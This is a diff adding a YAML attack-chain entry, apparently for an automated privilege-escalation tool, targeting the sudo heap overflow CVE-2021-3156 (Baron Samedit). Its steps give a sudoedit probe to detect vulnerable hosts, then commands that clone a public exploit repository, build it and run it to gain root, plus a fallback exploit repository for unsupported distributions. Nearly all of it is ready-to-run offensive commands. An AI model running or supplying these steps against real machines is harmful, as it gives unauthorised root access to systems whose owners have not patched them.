@@ -1,0 +1,46 @@
+chain_id: sudo_baron_samedit_cve_2021_3156
+title: "Linux privesc — CVE-2021-3156 sudo Baron Samedit (heap overflow)"
+severity: CRITICAL
+tags: [linux, privesc, sudo, cve-2021-3156, baron-samedit, kernel-cve]
+
+trigger:
+  any_of:
+    - { kind: "suid-binary", banner_pattern: "(?i)/sudo$" }
+
+description: |
+  Heap-based buffer overflow in `sudoedit -s` (sudo ≤ 1.9.5p1). The
+  user does not need any sudo entry of their own — every Linux box
+  with a SUID sudo from 2010-2021 is vulnerable until patched. The
+  resulting heap layout corruption gives reliable privilege escalation
+  to root.
+
+steps:
+  - id: 1
+    title: "Confirm vulnerability with the upstream tester"
+    command: |
+      sudoedit -s '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'
+      # If the response includes 'sudoedit:' the box is vulnerable; a
+      # 'usage' message means it's patched.
+
+  - id: 2
+    title: "Drop and build the canonical PoC"
+    command: |
+      git clone https://github.com/blasty/CVE-2021-3156.git
+      cd CVE-2021-3156
+      make all
+      ./sudo-hax-me-a-sandwich 0   # try the matching distro id
+
+  - id: 3
+    title: "Confirm root"
+    command: id
+
+common_errors:
+  - error: "sudo-hax: failed to exec, distro not supported"
+    solution: |
+      The exploit ships per-distro offsets. Try the other build IDs in
+      `make help`, or use the alternative one-shot build at
+      https://github.com/CptGibbon/CVE-2021-3156
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-3156
+  - https://github.com/blasty/CVE-2021-3156
